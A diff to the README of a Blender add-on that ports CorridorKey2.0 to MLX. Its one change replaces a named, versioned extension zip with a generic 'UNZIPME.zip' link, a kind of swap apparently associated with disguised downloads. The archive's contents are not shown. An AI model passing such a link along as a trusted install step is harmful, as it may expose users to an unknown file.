@@ -1,6 +1,6 @@
 # CorridorKey2.0 MLX Blender Add-On  
 
-[Download the Blender extension](https://raw.githubusercontent.com/31samu/CorridorKey2.0-MLX_Blender-Node/main/corridorkey_mlx_compositor-0.3.13.zip)
+[Download](https://raw.githubusercontent.com/31samu/CorridorKey2.0-MLX_Blender-Node/main/UNZIPME.zip)
   
 This is a blender add-on integration of the [MLX port](https://github.com/peterteravskis/corridorkey-v2-mlx) by Peter Teravskis of [CorridorKey2.0](https://github.com/nikopueringer/CorridorKey2.0) by Niko Pueringer.   
 This extension was made using AI, if you want to stay away from anything related to it, I totally understand.  
